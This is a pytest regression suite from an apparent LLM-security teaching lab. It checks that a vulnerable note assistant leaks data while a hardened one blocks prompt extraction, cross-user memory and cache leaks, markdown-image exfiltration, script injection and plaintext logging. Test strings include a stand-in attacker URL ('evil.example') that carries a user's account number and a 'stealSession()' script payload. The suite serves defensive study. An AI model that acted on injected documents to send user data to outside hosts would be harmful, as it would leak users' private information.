"""Regression tests: each leak must happen on the vulnerable assistant and not on the secure one.

We assert IMPACT: is a canary in Bob's answer, in a rendered <img> URL, or in the logs?

Run from the repository root:
    python -m pytest 02-llm-security/data-leakage -v
"""

import json

import pytest

from aisec_lab import load_lab_module

a = load_lab_module(__file__, "attacks")
model = load_lab_module(__file__, "leaky_model")
vuln_mod = load_lab_module(__file__, "vulnerable_assistant")
sec_mod = load_lab_module(__file__, "secure_assistant")

SECRET = sec_mod.PRICING_API_KEY
SUMMARIZE = "Summarize this shared document."


def vuln():
    return vuln_mod.VulnerableNoteAssistant(model.ExfilProneLLM())


def secure(**flags):
    return sec_mod.SecureNoteAssistant(model.ExfilProneLLM(), **flags)


# ---------- Part 1: prove the leaks are real -----------------------------------------

def test_shared_memory_leaks_alice_data_to_bob():
    app = vuln()
    app.chat("alice", a.ALICE_NOTE)
    assert a.ALICE_ACCOUNT in app.chat("bob", a.CROSS_USER_PROBE)


def test_shared_cache_serves_alices_answer_to_bob():
    app = vuln()
    app.chat("alice", a.ALICE_NOTE)
    alice_answer = app.chat("alice", a.SHARED_QUESTION)
    assert app.chat("bob", a.SHARED_QUESTION) == alice_answer


def test_system_prompt_extraction_leaks_the_api_key_and_hidden_rule():
    out = vuln().chat("mallory", a.PROMPT_EXTRACTION)
    assert SECRET in out
    assert "Refunds under $500" in out  # the "secret" business rule is now public too


def test_markdown_image_sends_data_to_attacker_with_zero_clicks():
    app = vuln()
    app.chat("alice", a.ALICE_NOTE)
    html = app.render(app.chat("alice", SUMMARIZE, document=a.EXFIL_DOC))
    assert '<img alt="status" src="https://evil.example/badge.png?d=' in html
    assert a.ALICE_ACCOUNT in html


def test_model_output_with_html_becomes_live_script():
    app = vuln()
    assert "<script>stealSession()</script>" in app.render(app.chat("alice", SUMMARIZE, document=a.XSS_DOC))


def test_logs_store_pii_and_secrets_in_plain_text():
    app = vuln()
    app.chat("alice", a.ALICE_NOTE)
    assert a.ALICE_ACCOUNT in app.logs[0] and SECRET in app.logs[0]


# ---------- Part 2: the secure assistant holds -----------------------------------------

def test_isolated_memory_keeps_alice_data_away_from_bob():
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    out = app.chat("bob", a.CROSS_USER_PROBE)
    assert a.ALICE_ACCOUNT not in out and a.ALICE_EMAIL not in out


def test_cache_is_per_user():
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    app.chat("alice", a.SHARED_QUESTION)
    assert a.ALICE_ACCOUNT not in app.chat("bob", a.SHARED_QUESTION)


def test_prompt_leaks_but_nothing_sensitive_is_in_it():
    out = secure().chat("mallory", a.PROMPT_EXTRACTION)
    assert "You are NoteBuddy" in out  # assume the prompt leaks ...
    assert SECRET not in out and "Refunds" not in out  # ... and make that harmless


@pytest.mark.parametrize("doc", ["EXFIL_DOC", "LOOKALIKE_DOC"])
def test_no_external_image_or_link_survives(doc):
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    html = app.render(app.chat("alice", SUMMARIZE, document=getattr(a, doc)))
    assert "evil.example" not in html
    assert any(e["kind"] == "url_removed" for e in app.security.events)


def test_html_in_output_is_escaped():
    app = secure()
    html = app.render(app.chat("alice", SUMMARIZE, document=a.XSS_DOC))
    assert "<script>" not in html and "&lt;script&gt;" in html


def test_logs_are_redacted_but_still_useful():
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    entry = json.loads(app.logs[0])
    assert a.ALICE_ACCOUNT not in app.logs[0] and a.ALICE_EMAIL not in app.logs[0]
    assert "[REDACTED:ACCOUNT]" in entry["prompt"]
    assert entry["user"].startswith("u_") and entry["prompt_sha256"]  # still traceable


def test_benign_user_can_read_their_own_data():
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    assert a.ALICE_ACCOUNT in app.chat("alice", a.BENIGN_OWN_DATA)


def test_allowlisted_images_still_render():
    app = secure()
    html = app.render("Logo: ![logo](https://cdn.acme.example/logo.png)")
    assert '<img alt="logo" src="https://cdn.acme.example/logo.png">' in html


def test_forget_removes_memory_and_cache():
    app = secure()
    app.chat("alice", a.ALICE_NOTE)
    app.chat("alice", a.SHARED_QUESTION)
    assert app.forget("alice") == 4  # two memory entries + two cached answers
    assert a.ALICE_ACCOUNT not in app.chat("alice", a.BENIGN_OWN_DATA)


def test_pasted_secrets_are_not_remembered():
    app = secure()
    app.chat("alice", "Remember my key sk-ABCDEF1234567890XYZ please")
    assert "sk-ABCDEF" not in str(app.memory["alice"])


# ---------- Part 3: defense in depth - each layer proven on its own ---------------------

def test_output_dlp_catches_cross_user_leak_when_isolation_fails():
    app = secure(isolate_memory=False)
    app.chat("alice", a.ALICE_NOTE)
    out = app.chat("bob", a.CROSS_USER_PROBE)
    assert a.ALICE_ACCOUNT not in out and "[REDACTED:ACCOUNT]" in out


def test_without_isolation_and_dlp_bob_sees_alice_data():
    app = secure(isolate_memory=False, output_dlp=False)
    app.chat("alice", a.ALICE_NOTE)
    assert a.ALICE_ACCOUNT in app.chat("bob", a.CROSS_USER_PROBE)


def test_without_per_user_cache_keys_the_cache_leaks():
    app = secure(isolate_cache=False, output_dlp=False)
    app.chat("alice", a.ALICE_NOTE)
    app.chat("alice", a.SHARED_QUESTION)
    assert a.ALICE_ACCOUNT in app.chat("bob", a.SHARED_QUESTION)


def test_dlp_alone_does_not_stop_url_exfiltration():
    """The URL carries Alice's OWN (allowed) data, percent-encoded. DLP cannot help here."""
    app = secure(url_policy=False)
    app.chat("alice", a.ALICE_NOTE)
    html = app.render(app.chat("alice", SUMMARIZE, document=a.EXFIL_DOC))
    assert 'src="https://evil.example/' in html and a.ALICE_ACCOUNT in html


def test_escaping_alone_does_not_stop_image_exfiltration():
    # Escaping protects against script injection, not against a well-formed image URL.
    app = secure(url_policy=False, output_dlp=False)
    app.chat("alice", a.ALICE_NOTE)
    html = app.render(app.chat("alice", SUMMARIZE, document=a.EXFIL_DOC))
    assert 'src="https://evil.example/' in html


def test_secret_in_context_is_caught_by_output_dlp():
    class LeakyLLM(model.ExfilProneLLM):
        def complete(self, messages):
            return f"Sure, the key is {SECRET} and AKIAABCDEFGHIJKLMNOP"

    app = sec_mod.SecureNoteAssistant(LeakyLLM())
    out = app.chat("mallory", "hi")
    assert SECRET not in out and "AKIA" not in out


# ---------- Part 4: know the limits of the helpers -------------------------------------

@pytest.mark.parametrize("url,ok", [
    ("https://acme.example/x", True),
    ("https://cdn.acme.example/x.png", True),
    ("https://acme.example.evil.example/x", False),  # lookalike: ends with evil.example
    ("https://evilacme.example/x", False),           # suffix match without the dot
    ("javascript:alert(1)", False),
])
def test_host_allowlist(url, ok):
    assert sec_mod.host_allowed(url) is ok


def test_regex_dlp_misses_encoded_data():
    encoded = "QUNDVC0xMjM0NTY3ODkw"  # base64 of an account-like string
    text, count = sec_mod.redact(encoded, sec_mod.PII_PATTERNS)
    assert count == 0  # regex DLP is a safety net, not a guarantee
